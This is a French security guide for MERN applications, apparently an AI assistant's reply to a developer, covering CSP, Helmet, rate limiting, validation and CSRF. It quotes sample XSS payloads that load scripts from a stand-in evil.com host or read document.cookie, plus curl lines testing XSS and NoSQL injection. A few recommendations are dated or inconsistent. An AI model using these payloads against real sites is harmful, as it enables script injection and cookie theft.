# 🔐 Guide Expert : Sécurité MERN en 2025

## 📚 Table des matières
1. [Content Security Policy (CSP) - Explication Complète](#1-content-security-policy-csp)
2. [Les 12 Couches de Sécurité Essentielles](#2-les-12-couches-de-sécurité-essentielles)
3. [Configuration Optimale 2025](#3-configuration-optimale-2025)

---

## 1. Content Security Policy (CSP) - Explication Complète

### 🎯 Qu'est-ce que CSP ?

**Content Security Policy** est un mécanisme de sécurité qui permet de **contrôler les ressources** qu'une page web peut charger et exécuter. C'est une **couche de défense contre les attaques XSS** (Cross-Site Scripting).

### 🧠 Comment ça fonctionne ?

#### Le Problème Sans CSP :
```javascript
// Un attaquant injecte ce code dans votre site :
<script src="https://evil.com/steal-data.js"></script>

// Sans CSP, le navigateur exécute ce script malveillant ! 😱
```

#### La Solution Avec CSP :
```javascript
// Votre serveur envoie un header HTTP :
Content-Security-Policy: script-src 'self'

// Le navigateur BLOQUE le script malveillant car il ne vient pas de 'self' ! ✅
```

### 📖 Anatomie de CSP

CSP fonctionne via des **directives** (règles) qui définissent d'où peuvent provenir les ressources :

```javascript
helmet.contentSecurityPolicy({
  directives: {
    // Règle par défaut pour TOUTES les ressources
    defaultSrc: ["'self'"],
    
    // Scripts JavaScript (<script>)
    scriptSrc: ["'self'", "'unsafe-inline'", "cdn.example.com"],
    
    // Styles CSS (<link>, <style>)
    styleSrc: ["'self'", "'unsafe-inline'", "fonts.googleapis.com"],
    
    // Images (<img>)
    imgSrc: ["'self'", "data:", "https:"],
    
    // Polices (@font-face)
    fontSrc: ["'self'", "fonts.gstatic.com"],
    
    // Connexions AJAX/Fetch/WebSocket
    connectSrc: ["'self'", "api.example.com"],
    
    // Frames/iframes
    frameSrc: ["'self'", "youtube.com"],
    
    // Objets (<object>, <embed>)
    objectSrc: ["'none'"],
    
    // Base URI pour les URLs relatives
    baseUri: ["'self'"],
    
    // Où les formulaires peuvent envoyer des données
    formAction: ["'self'"],
    
    // Ancêtres qui peuvent inclure cette page en iframe
    frameAncestors: ["'none'"],
    
    // Activer le mode "block" (vs "report-only")
    upgradeInsecureRequests: [],
  }
})
```

### 🔑 Mots-clés Spéciaux

| Mot-clé | Signification | Exemple |
|---------|--------------|---------|
| `'self'` | Même origine (domaine + protocole + port) | `https://monsite.com` peut charger de `https://monsite.com` |
| `'none'` | Aucune source autorisée | Bloque tout |
| `'unsafe-inline'` | ⚠️ Autorise le code inline | `<script>alert(1)</script>` autorisé |
| `'unsafe-eval'` | ⚠️ Autorise eval() | `eval("alert(1)")` autorisé |
| `data:` | URLs data: | `<img src="data:image/png;base64,...">` |
| `https:` | Toutes les sources HTTPS | N'importe quel site HTTPS |
| `*` | ⚠️ Toutes les sources | Très dangereux ! |

**⚠️ ATTENTION** : `'unsafe-inline'` et `'unsafe-eval'` **annulent la protection XSS** ! Évitez-les !

### 💡 Votre Configuration Actuelle Analysée

```javascript
helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],          // ✅ Bon : tout par défaut vient de votre domaine
    scriptSrc: ["'self'"],           // ✅ Bon : scripts uniquement de votre domaine
    connectSrc: ["'self'", 'api.citation-presence.com'], // ⚠️ Voir ci-dessous
  },
})
```

**Problème potentiel** : `api.citation-presence.com` sans protocole.
- ✅ Bon : `'https://api.citation-presence.com'`
- ❌ Mauvais : `'api.citation-presence.com'` (accepte http ET https)

### 🎓 Scénarios Réels

#### Scénario 1 : Attaque XSS Bloquée
```javascript
// Attaquant injecte dans un champ de commentaire :
"><script src="https://evil.com/keylogger.js"></script>

// Avec CSP scriptSrc: ["'self'"]
// ✅ Navigateur refuse de charger le script
// ✅ Console : "Refused to load script from 'https://evil.com/...' 
//             because it violates the Content Security Policy directive"
```

#### Scénario 2 : Inline Script Bloqué
```javascript
// Code vulnérable qui génère du HTML :
userInput = "<img src=x onerror='alert(document.cookie)'>"
document.innerHTML = userInput

// Avec CSP scriptSrc: ["'self'"] (pas 'unsafe-inline')
// ✅ Le script inline dans onerror est BLOQUÉ
```

### 🚀 Alternatives Sécurisées à 'unsafe-inline'

#### ❌ Mauvais (avec 'unsafe-inline') :
```html
<script>
  console.log('Hello');
</script>
```

#### ✅ Bon (script externe) :
```html
<script src="/assets/app.js"></script>
```

#### ✅ Bon (avec nonce) :
```javascript
// Serveur génère un nonce aléatoire par requête
helmet.contentSecurityPolicy({
  directives: {
    scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.cspNonce}'`]
  }
})

// HTML :
<script nonce="abc123xyz">console.log('Hello');</script>
```

### 🔍 Comment Tester CSP

1. **Ouvrir DevTools** → Onglet **Console**
2. **Onglet Network** → Regarder les headers de réponse
3. Chercher : `Content-Security-Policy: ...`
4. Les violations apparaissent en rouge dans la console

### 📊 Mode Report-Only (pour tester)

Avant de bloquer, testez avec le mode report :

```javascript
helmet.contentSecurityPolicyReportOnly({
  directives: {
    defaultSrc: ["'self'"],
    reportUri: '/api/csp-report' // Endpoint pour recevoir les rapports
  }
})
```

---

## 2. Les 12 Couches de Sécurité Essentielles

### ✅ Ce que vous avez déjà :

1. **CORS** - Contrôle qui peut appeler votre API
2. **Helmet CSP** - Protège contre XSS
3. **Rate Limiting** - Protège contre brute force
4. **Mongo Sanitize** - Protège contre NoSQL injection

### 🆕 Ce qu'il vous MANQUE (Critique en 2025) :

### 5. **Helmet Complet** (Tous les Headers)

**Pourquoi ?** Helmet a **15 protections** différentes, vous n'utilisez que CSP !

```javascript
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"], // Pour React
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'", process.env.API_URL],
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      mediaSrc: ["'self'"],
      frameSrc: ["'none'"],
    },
  },
  crossOriginEmbedderPolicy: true,
  crossOriginOpenerPolicy: { policy: "same-origin" },
  crossOriginResourcePolicy: { policy: "same-origin" },
  dnsPrefetchControl: { allow: false },
  frameguard: { action: "deny" },
  hidePoweredBy: true,
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  },
  ieNoOpen: true,
  noSniff: true,
  originAgentCluster: true,
  permittedCrossDomainPolicies: { permittedPolicies: "none" },
  referrerPolicy: { policy: "no-referrer" },
  xssFilter: true,
}));
```

**Explications des headers** :

- **HSTS** : Force HTTPS pendant 1 an
- **X-Frame-Options** : Empêche votre site d'être dans une iframe (protège contre clickjacking)
- **X-Content-Type-Options** : Empêche le navigateur de "deviner" le type MIME
- **Referrer-Policy** : Ne pas envoyer l'URL complète dans les requêtes externes
- **X-XSS-Protection** : Protection XSS supplémentaire pour vieux navigateurs

### 6. **Limitation par IP + Endpoint**

**Pourquoi ?** Rate limiting global = pas assez granulaire !

```javascript
// Rate limiting différent par endpoint
const createAccountLimiter = rateLimit({
  windowMs: 60 * 60 * 1000, // 1 heure
  max: 5, // 5 comptes max par heure
  message: 'Trop de comptes créés, réessayez dans 1 heure'
});

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 tentatives de login
  skipSuccessfulRequests: true, // Ne compte que les échecs
  message: 'Trop de tentatives de connexion'
});

app.post('/api/register', createAccountLimiter, ...);
app.post('/api/login', loginLimiter, ...);
```

### 7. **Validation des Entrées (Express-Validator)**

**Pourquoi ?** Vous avez express-validator installé mais pas utilisé !

```javascript
// validators/quoteValidator.js - AMÉLIORÉ
import { body, param, validationResult } from 'express-validator';

export const createQuoteValidation = [
  body('text')
    .trim()
    .isLength({ min: 1, max: 500 })
    .withMessage('Le texte doit faire entre 1 et 500 caractères')
    .matches(/^[a-zA-Z0-9\s.,!?'"àâäéèêëïîôùûüÿçÀÂÄÉÈÊËÏÎÔÙÛÜŸÇ-]*$/)
    .withMessage('Caractères non autorisés détectés')
    .escape(), // Échappe HTML
  
  body('author')
    .optional()
    .trim()
    .isLength({ max: 100 })
    .escape(),
  
  body('category')
    .optional()
    .isIn(['motivation', 'amour', 'sagesse', 'humour'])
    .withMessage('Catégorie invalide'),
    
  // Middleware pour vérifier les erreurs
  (req, res, next) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ 
        success: false,
        errors: errors.array() 
      });
    }
    next();
  }
];
```

### 8. **Protection CSRF (pour les cookies)**

**Pourquoi ?** Si vous utilisez des cookies (`credentials: true` dans CORS)

```bash
npm install csurf
```

```javascript
import csrf from 'csurf';

const csrfProtection = csrf({ 
  cookie: {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict'
  }
});

app.use(csrfProtection);

// Envoyer le token au client
app.get('/api/csrf-token', (req, res) => {
  res.json({ csrfToken: req.csrfToken() });
});
```

### 9. **Limitation Taille des Payloads**

**Pourquoi ?** Empêche les attaques DoS par gros payloads

```javascript
app.use(express.json({ limit: '10kb' })); // Max 10KB par requête
app.use(express.urlencoded({ extended: true, limit: '10kb' }));
```

### 10. **HPP (HTTP Parameter Pollution)**

**Pourquoi ?** Empêche les attaques par paramètres en double

```bash
npm install hpp
```

```javascript
import hpp from 'hpp';

app.use(hpp()); // Protège contre ?id=1&id=2
```

### 11. **Logs de Sécurité**

**Pourquoi ?** Détecter les attaques en cours

```javascript
import morgan from 'morgan';
import fs from 'fs';
import path from 'path';

// Logger toutes les requêtes suspectes
app.use(morgan('combined', {
  stream: fs.createWriteStream(path.join(__dirname, 'access.log'), { flags: 'a' }),
  skip: (req, res) => res.statusCode < 400 // Ne log que les erreurs
}));
```

### 12. **Variables d'Environnement Sécurisées**

**Pourquoi ?** Secrets jamais dans le code !

```javascript
// .env (JAMAIS commité)
NODE_ENV=production
PORT=4000
MONGO_URI=mongodb+srv://user:STRONG_PASSWORD@cluster.mongodb.net/db
JWT_SECRET=super_secret_key_minimum_32_characters_long
ALLOWED_ORIGINS=https://citation-presence.com,https://www.citation-presence.com

// app.js
import dotenv from 'dotenv';
dotenv.config();

// Validation des variables requises
const requiredEnvVars = ['MONGO_URI', 'JWT_SECRET', 'ALLOWED_ORIGINS'];
requiredEnvVars.forEach(varName => {
  if (!process.env[varName]) {
    console.error(`❌ Variable d'environnement manquante : ${varName}`);
    process.exit(1);
  }
});
```

---

## 3. Configuration Optimale 2025

### 🎯 Structure Recommandée

```
server/
├── src/
│   ├── config/
│   │   ├── security.js       ← Configuration centralisée
│   │   ├── cors.js
│   │   └── db.js
│   ├── middlewares/
│   │   ├── rateLimits.js     ← Différents limiters
│   │   ├── mongoSanitize.js
│   │   ├── errorHandler.js   ← Gestion d'erreurs sécurisée
│   │   └── logger.js
│   └── app.js
```

### 🔒 Checklist de Sécurité 2025

- [ ] Helmet complet configuré
- [ ] CSP sans 'unsafe-inline' / 'unsafe-eval'
- [ ] HTTPS obligatoire (HSTS)
- [ ] Rate limiting par endpoint
- [ ] Validation stricte des entrées
- [ ] Sanitization NoSQL
- [ ] CORS configuré précisément
- [ ] Cookies sécurisés (httpOnly, secure, sameSite)
- [ ] Protection CSRF si cookies
- [ ] Limitation taille payloads
- [ ] HPP activé
- [ ] Logs de sécurité
- [ ] Variables d'environnement sécurisées
- [ ] Pas de stack traces en production
- [ ] Dépendances à jour (`npm audit`)
- [ ] Tests de sécurité automatisés

### 🧪 Comment Tester

```bash
# 1. Audit des dépendances
npm audit fix

# 2. Test XSS
curl -X POST http://localhost:4000/api/quotes \
  -H "Content-Type: application/json" \
  -d '{"text":"<script>alert(1)</script>"}'

# 3. Test NoSQL Injection
curl -X GET "http://localhost:4000/api/quotes?author[$ne]=null"

# 4. Test Rate Limiting
for i in {1..150}; do
  curl http://localhost:4000/api/quotes
done

# 5. Test Headers Sécurité
curl -I http://localhost:4000 | grep -E "(X-|Content-Security|Strict-Transport)"
```

### 📚 Ressources pour Aller Plus Loin

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)
- [Security Headers](https://securityheaders.com/)
- [Mozilla Observatory](https://observatory.mozilla.org/)

---

## 🎓 Résumé : Pourquoi Chaque Couche est Essentielle

| Couche | Protège contre | Priorité |
|--------|----------------|----------|
| Helmet (complet) | XSS, Clickjacking, MIME sniffing | 🔴 Critique |
| CSP | XSS, injection de scripts | 🔴 Critique |
| CORS | Requêtes cross-origin non autorisées | 🔴 Critique |
| Rate Limiting | Brute force, DoS | 🔴 Critique |
| Input Validation | Injection SQL/NoSQL, XSS | 🔴 Critique |
| Mongo Sanitize | Injection NoSQL | 🟡 Important |
| CSRF Protection | Attaques CSRF | 🟡 Important (si cookies) |
| HPP | Parameter pollution | 🟢 Recommandé |
| Payload Limiting | DoS par gros payloads | 🟢 Recommandé |
| Logs | Détection d'attaques | 🟢 Recommandé |

---

**🎯 Prochaines étapes** : Je vais maintenant améliorer votre code avec toutes ces protections !
